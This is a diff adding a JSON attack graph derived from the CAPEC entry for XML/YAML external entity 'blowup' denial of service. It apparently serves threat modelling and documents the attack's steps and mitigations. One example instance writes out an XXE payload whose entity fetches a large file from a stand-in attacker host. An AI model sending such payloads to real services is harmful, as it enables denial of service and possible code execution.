@@ -1,0 +1,178 @@
+{
+  "graph": {
+    "capec_id": "221",
+    "name": "Data Serialization External Entities Blowup",
+    "abstraction": "Detailed",
+    "status": "Draft",
+    "description": "This attack takes advantage of the entity replacement property of certain data serialization languages (e.g., XML, YAML, etc.) where the value of the replacement is a URI. A well-crafted file could have the entity refer to a URI that consumes a large amount of resources to create a denial of service condition. This can cause the system to either freeze, crash, or execute arbitrary code depending on the URI.",
+    "likelihood": "",
+    "severity": "",
+    "related_attack_patterns": [
+      {
+        "capec_id": "231",
+        "nature": "ChildOf"
+      },
+      {
+        "capec_id": "278",
+        "nature": "ChildOf"
+      }
+    ],
+    "prerequisites": [
+      "A server that has an implementation that accepts entities containing URI values."
+    ],
+    "skills_required": [],
+    "resources_required": [],
+    "consequences": [
+      {
+        "scope": [
+          "Availability"
+        ],
+        "impact": "Resource Consumption"
+      },
+      {
+        "scope": [
+          "Confidentiality",
+          "Integrity",
+          "Availability"
+        ],
+        "impact": "Execute Unauthorized Commands"
+      }
+    ],
+    "mitigations": [
+      "This attack may be mitigated by tweaking the XML parser to not resolve external entities. If external entities are needed, then implement a custom XmlResolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally.",
+      "This attack may be mitigated by tweaking the serialized data parser to not resolve external entities. If external entities are needed, then implement a custom resolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally."
+    ],
+    "example_instances": [
+      "In this example, the XML parser parses the attacker's XML and opens the malicious URI where the attacker controls the server and writes a massive amount of data to the response stream. In this example the malicious URI is a large file transfer. <?xml version=\"1.0\"?>  < !DOCTYPE bomb [  <!ENTITY detonate SYSTEM \"http://www.malicious-badguy.com/myhugefile.exe\">  ]>  <bomb>&detonate;</bomb>"
+    ],
+    "related_weaknesses": [
+      "611"
+    ],
+    "matched_cwes": [
+      "611"
+    ],
+    "taxonomy_mappings": [
+      {
+        "taxonomy_name": "WASC",
+        "entry_id": "43",
+        "entry_name": "XML External Entities"
+      }
+    ],
+    "execution_flow": [
+      {
+        "step": "1",
+        "phase": "Explore",
+        "description": "[Find target web service] The adversary must first find a web service that takes input data in the form of a serialized language such as XML or YAML.",
+        "techniques": []
+      },
+      {
+        "step": "2",
+        "phase": "Experiment",
+        "description": "[Host malicious file on a server] The adversary will create a web server that contains a malicious file. This file will be extremely large, so that if a web service were to try to load it, the service would most likely hang.",
+        "techniques": []
+      },
+      {
+        "step": "2",
+        "phase": "Experiment",
+        "description": "[Craft malicious data] Using the serialization language that the web service takes as input, the adversary will craft data that links to the malicious file using an external entity reference to the URL of the file.",
+        "techniques": []
+      },
+      {
+        "step": "4",
+        "phase": "Exploit",
+        "description": "[Send serialized data containing URI] The adversary will send specially crafted serialized data to the web service. When the web service loads the input, it will attempt to download the malicious file. Depending on the amount of memory the web service has, this could either crash the service or cause it to hang, resulting in a Denial of Service attack.",
+        "techniques": []
+      }
+    ],
+    "directed": true
+  },
+  "nodes": [
+    {
+      "id": "find_target_web_service",
+      "attributes": {}
+    },
+    {
+      "id": "find_a_web_service_that_takes_input_data_in_the_form_of_a_serialized_language_such_as_xml_or_yaml",
+      "attributes": {}
+    },
+    {
+      "id": "create_a_web_server_that_contains_a_malicious_file",
+      "attributes": {}
+    },
+    {
+      "id": "try_to_load_it",
+      "attributes": {}
+    },
+    {
+      "id": "use_malicious_data",
+      "attributes": {}
+    },
+    {
+      "id": "send_serialized_data_containing_uri",
+      "attributes": {}
+    },
+    {
+      "id": "send_specially_crafted_serialized_data",
+      "attributes": {}
+    },
+    {
+      "id": "load_the_input",
+      "attributes": {}
+    },
+    {
+      "id": "parse_the_attacker_s_xml",
+      "attributes": {}
+    },
+    {
+      "id": "accept_entities_containing_uri_values",
+      "attributes": {}
+    }
+  ],
+  "edges": [
+    {
+      "source": "find_target_web_service",
+      "target": "find_a_web_service_that_takes_input_data_in_the_form_of_a_serialized_language_such_as_xml_or_yaml",
+      "attributes": {}
+    },
+    {
+      "source": "find_a_web_service_that_takes_input_data_in_the_form_of_a_serialized_language_such_as_xml_or_yaml",
+      "target": "create_a_web_server_that_contains_a_malicious_file",
+      "attributes": {}
+    },
+    {
+      "source": "create_a_web_server_that_contains_a_malicious_file",
+      "target": "try_to_load_it",
+      "attributes": {}
+    },
+    {
+      "source": "try_to_load_it",
+      "target": "use_malicious_data",
+      "attributes": {}
+    },
+    {
+      "source": "use_malicious_data",
+      "target": "send_serialized_data_containing_uri",
+      "attributes": {}
+    },
+    {
+      "source": "send_serialized_data_containing_uri",
+      "target": "send_specially_crafted_serialized_data",
+      "attributes": {}
+    },
+    {
+      "source": "send_specially_crafted_serialized_data",
+      "target": "load_the_input",
+      "attributes": {}
+    },
+    {
+      "source": "load_the_input",
+      "target": "parse_the_attacker_s_xml",
+      "attributes": {}
+    },
+    {
+      "source": "parse_the_attacker_s_xml",
+      "target": "accept_entities_containing_uri_values",
+      "attributes": {}
+    }
+  ]
+}
